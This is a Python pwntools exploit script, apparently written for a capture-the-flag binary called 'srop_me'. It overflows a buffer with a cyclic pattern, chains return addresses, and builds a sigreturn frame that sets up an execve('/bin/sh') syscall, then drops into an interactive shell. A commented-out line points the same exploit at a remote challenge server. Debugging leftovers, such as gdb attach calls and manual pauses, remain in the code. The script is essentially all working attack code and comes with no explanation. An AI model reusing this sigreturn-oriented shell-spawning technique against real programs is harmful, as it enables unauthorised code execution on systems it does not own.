from pwn import *


context.binary = elf = ELF('./srop_me')
io = process()
gdb.attach(io, api=True)
#io = remote('challs.n00bzunit3d.xyz', 38894)

offset = b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab'
sysnum = 162

# # Write '/bin/sh' to msg buffer (wrong idea, didn't realize the string /bin/sh already in binary)
io.recvuntil(b'!!\n')
payload = offset + p64(0x401024)
payload += offset + p64(0x40100a)
payload += b'\0'*(sysnum-len(payload)-1)
io.sendline(payload)
input('NEXT: ')
#time.sleep(5)
io.sendline(b"/bin/sh")
input('NEXT: ')

# Setup for SROP
#time.sleep(5)
payload = offset + p64(0x40101f)
payload += offset + p64(0x401031)
frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = 0x40200f # /bin/sh
frame.rsi = 0
frame.rdx = 0
frame.rip = 0x401031 # Syscall gadget
payload += bytes(frame)
io.sendline(payload)
input('NEXT: ')
#time.sleep(1)
io.sendline(b"i"*14)
io.interactive()